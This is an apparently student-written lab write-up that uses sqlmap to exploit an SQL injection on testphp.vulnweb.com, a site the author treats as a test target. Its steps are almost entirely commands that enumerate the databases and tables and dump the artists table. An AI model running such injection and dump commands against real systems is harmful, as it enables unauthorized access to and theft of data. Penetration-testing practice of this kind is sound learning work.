Step 1:
Get their database name through surviellience by using the command
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
I used this URL for test.php.vulnweb.com website and found a vulnerablity 
information_schema and acuart are the database names
Step 2:
Then I accessed the information schema database to get table names inside it. using this command
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D information_schema --tables
Step 3:
I dump all the content of on the of the authorization tables to complete my attack using the command
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D information_schema -T ADMINISTRABLE_ROLE_AUTHORIZATIONS -dump
However, i found that this table was empty so I went to acuart database and then dumped the artists table
using the following commands
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T artists -dump
